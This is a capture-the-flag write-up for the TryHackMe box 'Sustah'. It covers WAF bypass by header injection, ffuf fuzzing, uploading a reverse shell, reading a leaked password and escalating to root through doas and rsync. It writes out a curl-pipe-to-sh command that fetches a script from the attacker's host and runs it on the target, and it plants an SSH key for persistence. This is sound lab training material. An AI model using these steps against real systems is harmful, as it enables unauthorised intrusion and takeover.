This is a write up for the box SUSTAH on https://tryhackme.com/

First i add sustah to my /etc/hosts:

sudo vim /etc/hosts 

[![https://imgur.com/9VQSlLv.png](https://imgur.com/9VQSlLv.png)](https://imgur.com/9VQSlLv.png)

## Enumeration

First we start with a quick nmap scan.

[![https://imgur.com/dFiZBh9.png](https://imgur.com/dFiZBh9.png)](https://imgur.com/dFiZBh9.png)

Our gobuster doesnt give us any endpoints so lets look further.

There we can see the http port 8085 lets check it out.

[![https://imgur.com/nVxVCVL.png](https://imgur.com/nVxVCVL.png)](https://imgur.com/nVxVCVL.png)

Lets go for another gobuster on this port..

[![https://imgur.com/NJ6qyr5.png](https://imgur.com/NJ6qyr5.png)](https://imgur.com/NJ6qyr5.png)

So far we are pretty clueless.

Lets take a closer look at the inputfield.

We could try to bruteforce the right number with a method called fuzzing.
For that we create a wordlist of a specific range of numbers and lets it try each of them:

The tool we are going to use for that is called ffuf:

https://github.com/ffuf/ffuf

If we recall the description of the box:

"The developers have added anti-cheat measures to their game. Are you able to defeat the restrictions to gain access to their internal CMS?"
We probably also have to bypass a WAF.

Lets look at header injection by portswiggger:
https://portswigger.net/web-security/host-header/exploiting

By injecting the header in this way we can make the server belive the requests are coming from itself and therefor are trustworthy.

[![https://imgur.com/UbV0Trm.png](https://imgur.com/UbV0Trm.png)](https://imgur.com/UbV0Trm.png)

Now we can create our wordlist, we could use a onlinetool but we should try to write as much aspossible on our own :)

[![https://imgur.com/wnPqXyh.png](https://imgur.com/wnPqXyh.png)](https://imgur.com/wnPqXyh.png)

Now we can start our fuzzer tool:

We have to specify the wordlist we created with our little script, the headers to bypass the WAF, what we want to FUZZ, and the url.
I also added -fs which is a filter for the size 1004 because that is the normal response we would get if we have the wrong number.

[![https://imgur.com/4dDk7Ec.png](https://imgur.com/4dDk7Ec.png)](https://imgur.com/4dDk7Ec.png)

After inserting the right number we get a PATH.
After playing arround i found a adming loginpage with default credentials.
There we can upload files. 
Lets try to upload a reverseshell and run a nc listener.

[![https://imgur.com/pm551w8.png](https://imgur.com/pm551w8.png)](https://imgur.com/pm551w8.png)

Seems to work now we activate it by finding its location and clicking on it. ( or curl it )

[![https://imgur.com/iNkmr2K.png](https://imgur.com/iNkmr2K.png)](https://imgur.com/iNkmr2K.png)

Yes, it worked ! We are in :)

[![https://imgur.com/9NrVN9h.png](https://imgur.com/9NrVN9h.png)](https://imgur.com/9NrVN9h.png)

After searching for a good amount of time i find a backupfile of /etc/passwd with the password of kiran written in plaintext:

[![https://imgur.com/BZ4Iov1.png](https://imgur.com/BZ4Iov1.png)](https://imgur.com/BZ4Iov1.png)

First thing to do after: 
su kiran

is to create ssh keys

mkdir .ssh
ssh-keygen
touch authorized_keys
cat id_rsa.pub > authorized_keys

Now we can ssh into kiran with the -i parameter and the id_rsa key.


## Privescalation

After not finding any obvious vulnerabilities i decided to run linpeas.
Set up a simple python webserver on your host:

python3 -m http.server 1337

( you have to download linpeas first https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS )

then on the target in the /tmp directory:

curl http://youriphere:1337/linpeas.sh | sh

This will execute linpeas automatically.

The first thing that catches my eye is this doas.conf file which says we can run rsync as root:

[![https://imgur.com/JwnI0fg.png](https://imgur.com/JwnI0fg.png)](https://imgur.com/JwnI0fg.png)

So i tried ( i went to GTFOBINS to find privesc for rsync ) :   -> https://gtfobins.github.io/gtfobins/rsync/

[![https://imgur.com/sukmjzY.png](https://imgur.com/sukmjzY.png)](https://imgur.com/sukmjzY.png)

We can't run sudo since we don't have the sudo password. 

But what is this doas anyway? 

It seems to be a replacement for sudo where we can run commands as another user!

[![https://imgur.com/AQGteuV.png](https://imgur.com/AQGteuV.png)](https://imgur.com/AQGteuV.png)

So lets try to run rsync as user root since we dont need a password!

[![https://imgur.com/R4uinio.png](https://imgur.com/R4uinio.png)](https://imgur.com/R4uinio.png)

![Celebration](https://media.giphy.com/media/vmon3eAOp1WfK/giphy.gif)

Thank you for reading! 
